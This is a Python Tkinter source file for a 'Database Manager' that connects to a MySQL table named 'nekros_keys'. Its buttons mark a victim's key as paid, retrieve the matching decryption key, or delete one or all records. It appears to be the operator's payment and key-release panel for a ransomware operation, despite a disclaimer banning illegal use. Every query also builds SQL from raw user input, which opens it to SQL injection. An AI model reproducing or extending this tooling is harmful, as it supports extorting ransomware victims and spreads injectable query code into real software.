#! /usr/bin/env python

try:
    import Tkinter as tk
    import Tkinter.messagebox as tmsg
except ImportError:
    import tkinter as tk
    import tkinter.messagebox as tmsg    

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True

import sys
import mysql.connector
import configparser
import os.path

def start_gui():
    '''Starting point when module is the main routine.'''
    global root
    global prog_location
    prog_call = sys.argv[0]
    prog_location = os.path.split(prog_call)[0]
    root = tk.Tk()
    top = Toplevel1 (root)
    root.mainloop()

class Toplevel1:
    def __init__(self, top=None):
        '''This class configures and populates the toplevel window.
           top is the toplevel containing window.'''
        parser = configparser.RawConfigParser()
        config_file = 'config.txt'
        parser.read(config_file)
                
        self.server =  parser.get('DB_CREDS', 'server')
        self.username =  parser.get('DB_CREDS', 'username')
        self.password =  parser.get('DB_CREDS', 'password')
        self.db_name =  parser.get('DB_CREDS', 'db_name')
           
        _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
        _fgcolor = '#000000'  # X11 color: 'black'
        _compcolor = '#d9d9d9' # X11 color: 'gray85'
        _ana1color = '#d9d9d9' # X11 color: 'gray85'
        _ana2color = '#ececec' # Closest X11 color: 'gray92'

        top.geometry("815x327+237+164")
        top.minsize(124, 1)
        top.maxsize(1362, 741)
        top.resizable(0, 0)
        top.title("Database Manager - Select 1 Option At A TIME")
        top.configure(background="#ffffff")
        top.configure(highlightbackground="#d9d9d9")
        top.configure(highlightcolor="black")

        self.Label1 = tk.Label(top)
        self.Label1.place(relx=0.01, rely=0.006, height=241, width=204)
        self.Label1.configure(activebackground="#f9f9f9")
        self.Label1.configure(activeforeground="black")
        self.Label1.configure(background="#d9d9d9")
        self.Label1.configure(disabledforeground="#a3a3a3")
        self.Label1.configure(foreground="#000000")
        self.Label1.configure(highlightbackground="#d9d9d9")
        self.Label1.configure(highlightcolor="black")
        photo_location = os.path.join(prog_location,"db_update_img.PNG")
        global _img0
        _img0 = tk.PhotoImage(file=photo_location)
        self.Label1.configure(image=_img0)
        self.Label1.configure(text='''Label''')

        self.Entry1 = tk.Entry(top)
        self.Entry1.place(relx=0.488, rely=0.092,height=30, relwidth=0.483)
        self.Entry1.configure(background="white")
        self.Entry1.configure(disabledforeground="#a3a3a3")
        self.Entry1.configure(font="TkFixedFont")
        self.Entry1.configure(foreground="#000000")
        self.Entry1.configure(highlightbackground="#d9d9d9")
        self.Entry1.configure(highlightcolor="black")
        self.Entry1.configure(insertbackground="black")
        self.Entry1.configure(selectbackground="#c4c4c4")
        self.Entry1.configure(selectforeground="black")

        self.Label2 = tk.Label(top)
        self.Label2.place(relx=0.298, rely=0.092, height=31, width=144)
        self.Label2.configure(activebackground="#f9f9f9")
        self.Label2.configure(activeforeground="black")
        self.Label2.configure(background="#adadad")
        self.Label2.configure(disabledforeground="#a3a3a3")
        self.Label2.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Label2.configure(foreground="#000000")
        self.Label2.configure(highlightbackground="#d9d9d9")
        self.Label2.configure(highlightcolor="black")
        self.Label2.configure(text='''Enter Unique ID''')
        
        self.cb1 = tk.IntVar()
        self.Checkbutton1 = tk.Checkbutton(top)
        self.Checkbutton1.place(relx=0.72, rely=0.232, relheight=0.107
                , relwidth=0.259)
        self.Checkbutton1.configure(activebackground="#ececec")
        self.Checkbutton1.configure(activeforeground="#000000")
        self.Checkbutton1.configure(background="#adadad")
        self.Checkbutton1.configure(disabledforeground="#a3a3a3")
        self.Checkbutton1.configure(font="-family {Segoe UI} -size 13 -weight bold")
        self.Checkbutton1.configure(foreground="#000000")
        self.Checkbutton1.configure(highlightbackground="#d9d9d9")
        self.Checkbutton1.configure(highlightcolor="black")
        self.Checkbutton1.configure(justify='left')
        self.Checkbutton1.configure(text='''Payment Successful''')
        self.Checkbutton1.configure(variable=self.cb1)        

        self.cb2 = tk.IntVar()
        self.Checkbutton2 = tk.Checkbutton(top)
        self.Checkbutton2.place(relx=0.49, rely=0.232, relheight=0.107
                , relwidth=0.222)
        self.Checkbutton2.configure(activebackground="#ececec")
        self.Checkbutton2.configure(activeforeground="#000000")
        self.Checkbutton2.configure(background="#adadad")
        self.Checkbutton2.configure(disabledforeground="#a3a3a3")
        self.Checkbutton2.configure(font="-family {Segoe UI} -size 13 -weight bold")
        self.Checkbutton2.configure(foreground="#000000")
        self.Checkbutton2.configure(highlightbackground="#d9d9d9")
        self.Checkbutton2.configure(highlightcolor="black")
        self.Checkbutton2.configure(justify='left')
        self.Checkbutton2.configure(text='''Delete Record''')
        self.Checkbutton2.configure(variable=self.cb2)

        self.Button1 = tk.Button(top, command=self.action)
        self.Button1.place(relx=0.297, rely=0.245, height=34, width=147)
        self.Button1.configure(activebackground="#ececec")
        self.Button1.configure(activeforeground="#000000")
        self.Button1.configure(background="#adadad")
        self.Button1.configure(disabledforeground="#a3a3a3")
        self.Button1.configure(font="-family {Segoe UI} -size 13 -weight bold")
        self.Button1.configure(foreground="#000000")
        self.Button1.configure(highlightbackground="#d9d9d9")
        self.Button1.configure(highlightcolor="black")
        self.Button1.configure(pady="0")
        self.Button1.configure(text='''Update Record''')

        self.Labelframe1 = tk.LabelFrame(top)
        self.Labelframe1.place(relx=0.315, rely=0.373, relheight=0.413
                , relwidth=0.675)
        self.Labelframe1.configure(relief='groove')
        self.Labelframe1.configure(foreground="black")
        self.Labelframe1.configure(background="#ffffff")
        self.Labelframe1.configure(highlightbackground="#d9d9d9")
        self.Labelframe1.configure(highlightcolor="black")

        self.Label6 = tk.Label(self.Labelframe1)
        self.Label6.place(relx=0.02, rely=0.074, height=21, width=524
                , bordermode='ignore')
        self.Label6.configure(activebackground="#f9f9f9")
        self.Label6.configure(activeforeground="black")
        self.Label6.configure(background="#d9d9d9")
        self.Label6.configure(disabledforeground="#a3a3a3")
        self.Label6.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Label6.configure(foreground="#ffffff")
        self.Label6.configure(highlightbackground="#d9d9d9")
        self.Label6.configure(highlightcolor="black")
        self.Label6.configure(text='''Advance Usage Section''')

        self.cb3 = tk.IntVar()
        self.Checkbutton3 = tk.Checkbutton(self.Labelframe1)
        self.Checkbutton3.place(relx=0.022, rely=0.296, relheight=0.259
                , relwidth=0.438, bordermode='ignore')
        self.Checkbutton3.configure(activebackground="#ececec")
        self.Checkbutton3.configure(activeforeground="#000000")
        self.Checkbutton3.configure(background="#d9d9d9")
        self.Checkbutton3.configure(disabledforeground="#a3a3a3")
        self.Checkbutton3.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Checkbutton3.configure(foreground="#000000")
        self.Checkbutton3.configure(highlightbackground="#d9d9d9")
        self.Checkbutton3.configure(highlightcolor="black")
        self.Checkbutton3.configure(justify='left')
        self.Checkbutton3.configure(text='''Retrive Decryption Key''')
        self.Checkbutton3.configure(variable=self.cb3)

        self.cb4 = tk.IntVar()
        self.Checkbutton4 = tk.Checkbutton(self.Labelframe1)
        self.Checkbutton4.place(relx=0.478, rely=0.296, relheight=0.259
                , relwidth=0.493, bordermode='ignore')
        self.Checkbutton4.configure(activebackground="#ececec")
        self.Checkbutton4.configure(activeforeground="#000000")
        self.Checkbutton4.configure(background="#d9d9d9")
        self.Checkbutton4.configure(disabledforeground="#a3a3a3")
        self.Checkbutton4.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Checkbutton4.configure(foreground="#ff0000")
        self.Checkbutton4.configure(highlightbackground="#d9d9d9")
        self.Checkbutton4.configure(highlightcolor="black")
        self.Checkbutton4.configure(justify='left')
        self.Checkbutton4.configure(text='''Delete Whole Record''')
        self.Checkbutton4.configure(variable=self.cb4)

        self.Label7 = tk.Label(self.Labelframe1)
        self.Label7.place(relx=0.02, rely=0.593, height=41, width=524
                , bordermode='ignore')
        self.Label7.configure(activebackground="#f9f9f9")
        self.Label7.configure(activeforeground="black")
        self.Label7.configure(background="#d9d9d9")
        self.Label7.configure(disabledforeground="#a3a3a3")
        self.Label7.configure(font="-family {Segoe UI} -size 14 -weight bold")
        self.Label7.configure(foreground="#ffffff")
        self.Label7.configure(highlightbackground="#d9d9d9")
        self.Label7.configure(highlightcolor="black")
        self.Label7.configure(text='''RESULT SHOWN HERE''')

        self.Label3 = tk.Label(top)
        self.Label3.place(relx=0.007, rely=0.789, height=31, width=794)
        self.Label3.configure(activebackground="#f9f9f9")
        self.Label3.configure(activeforeground="black")
        self.Label3.configure(background="#ffffff")
        self.Label3.configure(disabledforeground="#a3a3a3")
        self.Label3.configure(font="-family {Segoe UI} -size 12")
        self.Label3.configure(foreground="#000000")
        self.Label3.configure(highlightbackground="#d9d9d9")
        self.Label3.configure(highlightcolor="black")
        self.Label3.configure(text='''Author : Pushpender Singh   |  Website : https://technowlogy.tk   |  Github : github.com/Technowlogy-Pushpender/''')

        self.Frame1 = tk.Frame(top)
        self.Frame1.place(relx=0.015, rely=0.878, relheight=0.107
                , relwidth=0.975)
        self.Frame1.configure(relief='groove')
        self.Frame1.configure(borderwidth="2")
        self.Frame1.configure(relief="groove")
        self.Frame1.configure(background="#ffffff")
        self.Frame1.configure(highlightbackground="#d9d9d9")
        self.Frame1.configure(highlightcolor="black")

        self.Label4 = tk.Label(self.Frame1)
        self.Label4.place(relx=0.009, rely=0.2, height=21, width=104)
        self.Label4.configure(activebackground="#f9f9f9")
        self.Label4.configure(activeforeground="black")
        self.Label4.configure(background="#d9d9d9")
        self.Label4.configure(disabledforeground="#a3a3a3")
        self.Label4.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Label4.configure(foreground="#ff0000")
        self.Label4.configure(highlightbackground="#d9d9d9")
        self.Label4.configure(highlightcolor="black")
        self.Label4.configure(text='''WARNING :''')

        self.Label5 = tk.Label(self.Frame1)
        self.Label5.place(relx=0.15, rely=0.2, height=21, width=664)
        self.Label5.configure(activebackground="#f9f9f9")
        self.Label5.configure(activeforeground="black")
        self.Label5.configure(background="#d7d7d7")
        self.Label5.configure(disabledforeground="#a3a3a3")
        self.Label5.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Label5.configure(foreground="#575757")
        self.Label5.configure(highlightbackground="#d9d9d9")
        self.Label5.configure(highlightcolor="black")
        self.Label5.configure(text='''Software Made for Good Purpose for Community!!     illegal Use is Prohibited!!''')
        
    def action(self):
        # 1 = True    &   2 = False
        if self.cb1.get() == 1:
            self.payment_success()
        elif self.cb2.get() == 1:
            self.delete_1_record()
        elif self.cb3.get() ==1:
            self.retrive_decryption_key()
        elif self.cb4.get() == 1:
            ans = tmsg.askyesnocancel("Questions", "You are Going to Delete All Records, Are U Sure & Want to do this?")
            if ans == True:            
                self.delete_all_record() 
            elif ans == False:
                tmsg.showwarning("Warning", "Don't Tick this option, If you don't want to erase all DB_Records!")

    def delete_1_record(self):
        try:
            mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
            mycursor = mydb.cursor()
            request = f"DELETE FROM nekros_keys WHERE software_key=\'{self.Entry1.get()}\'"
            mycursor.execute(request)
            self.Label7.configure(text='''Selected Record Deleted Successful''')
        except Exception:
            self.Label7.configure(text='''Unable to Retrive Decryption Key!''') 

    def delete_all_record(self):
        try:
            mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
            mycursor = mydb.cursor()
            request = f"DELETE FROM nekros_keys"
            mycursor.execute(request)
            self.Label7.configure(text='''!!! All Record Deleted Successful !!!''')
        except Exception:
            self.Label7.configure(text='''Unable to Delete All Records!''')             
            
    def retrive_decryption_key(self):
        try:
            mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
            mycursor = mydb.cursor()
            request = f"select decrypt_key from nekros_keys WHERE software_key=\'{self.Entry1.get()}\'"
            mycursor.execute(request)
            result_of_result = mycursor.fetchone()
            self.Label7.configure(text='RESULT : '+ str(result_of_result[0]))
        except Exception:
            self.Label7.configure(text='''Unable to Retrive Decryption Key!''')          
        
    def payment_success(self):
        try:
            mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name)
            mycursor = mydb.cursor()
            request = f"update nekros_keys set payment=True WHERE software_key=\'{self.Entry1.get()}\'"
            mycursor.execute(request)
            self.Label7.configure(text='''Database Updated Successfully!''')
        except Exception:
            self.Label7.configure(text='''Unable to Update record!''')        
     

if __name__ == '__main__':
    start_gui()





